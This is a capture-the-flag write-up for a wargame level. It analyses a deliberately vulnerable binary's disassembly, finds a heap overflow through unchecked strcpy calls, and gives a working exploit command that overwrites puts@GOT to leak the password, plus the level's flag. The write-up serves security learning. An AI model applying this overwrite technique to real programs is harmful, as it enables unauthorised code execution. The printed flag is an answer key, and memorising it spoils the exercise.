# Level 7

## Connect to the virtual machine with SSH

Use the flag from `level6` as the `level7` password:

```bash
ssh level7@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 level7@127.0.0.1:/home/user/level7/level7 ./level7/
```

The extracted binary is saved as `level7/level7`.

## Copy the GDB dump to the host

Inside the VM, connected as `level7`, open the binary with GDB:

```bash
gdb ./level7
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/level7_main_dump_gdb
set logging overwrite on
set logging on
disas main
disas m
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 level7@127.0.0.1:/tmp/level7_main_dump_gdb ./level7/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  -ex "disassemble m" \
  ./level7/level7 > ./level7/level7_main_dump_gdb
```

## Analyze the GDB dump

`main` creates two small structures on the heap. Each structure has an integer
followed by a pointer to another heap buffer:

```asm
0x0804852a <+9>:   mov    DWORD PTR [esp],0x8
0x08048531 <+16>:  call   0x80483f0 <malloc@plt>
0x08048536 <+21>:  mov    DWORD PTR [esp+0x1c],eax
0x0804853e <+29>:  mov    DWORD PTR [eax],0x1
0x08048544 <+35>:  mov    DWORD PTR [esp],0x8
0x0804854b <+42>:  call   0x80483f0 <malloc@plt>
0x08048556 <+53>:  mov    DWORD PTR [eax+0x4],edx
...
0x08048559 <+56>:  mov    DWORD PTR [esp],0x8
0x08048560 <+63>:  call   0x80483f0 <malloc@plt>
0x08048565 <+68>:  mov    DWORD PTR [esp+0x18],eax
0x0804856d <+76>:  mov    DWORD PTR [eax],0x2
0x08048573 <+82>:  mov    DWORD PTR [esp],0x8
0x0804857a <+89>:  call   0x80483f0 <malloc@plt>
0x08048585 <+100>: mov    DWORD PTR [eax+0x4],edx
```

Then the program performs two unchecked copies:

```asm
0x08048592 <+113>: mov    eax,DWORD PTR [esp+0x1c]
0x08048596 <+117>: mov    eax,DWORD PTR [eax+0x4]
0x080485a0 <+127>: call   0x80483e0 <strcpy@plt>
...
0x080485af <+142>: mov    eax,DWORD PTR [esp+0x18]
0x080485b3 <+146>: mov    eax,DWORD PTR [eax+0x4]
0x080485bd <+156>: call   0x80483e0 <strcpy@plt>
```

The first `strcpy` copies `argv[1]` into the first data buffer. Because
`strcpy` has no length check, `argv[1]` can overflow into the second structure.

The second `strcpy` copies `argv[2]` into the pointer stored in the second
structure. If we overwrite that pointer first, the second `strcpy` becomes an
arbitrary write.

At the end, the program opens and reads the next password into a global buffer,
then calls `puts`:

```asm
0x080485d3 <+178>: call   0x8048430 <fopen@plt>
0x080485e4 <+195>: mov    DWORD PTR [esp],0x8049960
0x080485eb <+202>: call   0x80483c0 <fgets@plt>
0x080485f0 <+207>: mov    DWORD PTR [esp],0x8048703
0x080485f7 <+214>: call   0x8048400 <puts@plt>
```

There is also a function `m`:

```asm
0x080484f4 <m>:
...
0x0804850f <+27>: mov    DWORD PTR [esp+0x4],0x8049960
0x0804851a <+38>: call   0x80483b0 <printf@plt>
```

`m` prints the global buffer that contains the password. So the goal is to
overwrite `puts@GOT` with the address of `m`. When the program calls `puts`, it
will call `m` instead.

Find `puts@GOT`:

```bash
objdump -R level7/level7 | grep puts
```

Result:

```text
08049928 R_386_JUMP_SLOT   puts@GLIBC_2.0
```

Target values:

```text
puts@GOT = 0x08049928
m        = 0x080484f4
```

## Find the exact heap offset

Do not guess the heap distance. Break right before the first `strcpy`, after
all four allocations have finished:

```gdb
break *main+103
run AAAA BBBB
p/x *(void **)($esp+0x1c)
p/x *(void **)(*(void **)($esp+0x1c)+4)
p/x *(void **)($esp+0x18)
p/x *(void **)(*(void **)($esp+0x18)+4)
p/d (*(void **)($esp+0x18)+4)-*(void **)(*(void **)($esp+0x1c)+4)
```

Result:

```text
Breakpoint 1, 0x08048588 in main ()
$1 = 0x804a008
$2 = 0x804a018
$3 = 0x804a028
$4 = 0x804a038
$5 = 20
```

So:

```text
second structure's pointer field - first data buffer = 20
```

After 20 bytes, `argv[1]` overwrites the second structure's destination pointer.

## Exploitation

Payload layout:

```text
argv[1] = 20 bytes padding + puts@GOT
argv[2] = address of m
```

Addresses in little endian:

```text
puts@GOT = 0x08049928 -> \x28\x99\x04\x08
m        = 0x080484f4 -> \xf4\x84\x04\x08
```

Run this in the VM:

```bash
/home/user/level7/level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

The first argument changes the destination of the second `strcpy` to
`puts@GOT`. The second argument writes `m` into `puts@GOT`.

When the program later calls `puts`, it jumps to `m`, which prints the password
buffer.

## Flag

```text
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
